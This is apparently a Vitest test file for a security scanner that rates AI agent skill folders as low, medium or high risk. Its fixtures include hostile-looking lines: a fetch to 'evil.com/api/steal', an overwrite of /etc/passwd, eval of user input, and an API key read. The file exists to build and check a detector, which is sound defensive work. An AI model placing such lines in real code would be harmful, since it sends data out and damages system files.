import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { analyzeSkillSecurity } from '../skill/skill-analyzer.js';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';

describe('skill-analyzer', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'skill-analyzer-test-'));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it('安全的 SKILL.md 应返回 low risk', () => {
    fs.writeFileSync(path.join(tempDir, 'SKILL.md'), `---
name: safe-skill
description: A safe skill
---

Use the Read tool to read files.
Use the Write tool to create output.`);

    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('low');
    expect(report.findings).toHaveLength(0);
  });

  it('包含 eval 的文件应标记为 high risk', () => {
    fs.writeFileSync(path.join(tempDir, 'helper.js'), `
const code = getUserInput();
const result = eval(code);
console.log(result);
`);

    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('high');
    expect(report.findings.some(f => f.type === 'eval')).toBe(true);
  });

  it('包含 new Function 的文件应标记为 high risk', () => {
    fs.writeFileSync(path.join(tempDir, 'dynamic.ts'), `
const fn = new Function('x', 'return x * 2');
`);

    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('high');
    expect(report.findings.some(f => f.type === 'function_constructor')).toBe(true);
  });

  it('包含 fetch 外部 URL 应标记为 medium risk', () => {
    fs.writeFileSync(path.join(tempDir, 'api.ts'), `
const data = await fetch("https://evil.com/api/steal");
`);

    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('medium');
    expect(report.findings.some(f => f.type === 'fetch')).toBe(true);
  });

  it('包含 fs.writeFile 应标记为 medium risk', () => {
    fs.writeFileSync(path.join(tempDir, 'writer.ts'), `
import fs from 'node:fs';
fs.writeFileSync('/etc/passwd', 'hacked');
`);

    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('medium');
    expect(report.findings.some(f => f.type === 'fs_write')).toBe(true);
  });

  it('包含 process.env 访问应标记为 low risk', () => {
    fs.writeFileSync(path.join(tempDir, 'env.ts'), `
const key = process.env['API_KEY'];
`);

    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('low');
    expect(report.findings.some(f => f.type === 'env_access')).toBe(true);
  });

  it('应跳过 node_modules 和隐藏目录', () => {
    fs.mkdirSync(path.join(tempDir, 'node_modules', 'pkg'), { recursive: true });
    fs.writeFileSync(path.join(tempDir, 'node_modules', 'pkg', 'index.js'), `eval('dangerous')`);

    fs.mkdirSync(path.join(tempDir, '.git'), { recursive: true });
    fs.writeFileSync(path.join(tempDir, '.git', 'hook.sh'), `eval dangerous`);

    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('low');
    expect(report.findings).toHaveLength(0);
  });

  it('空目录应返回 low risk', () => {
    const report = analyzeSkillSecurity(tempDir);
    expect(report.riskLevel).toBe('low');
    expect(report.findings).toHaveLength(0);
  });
});
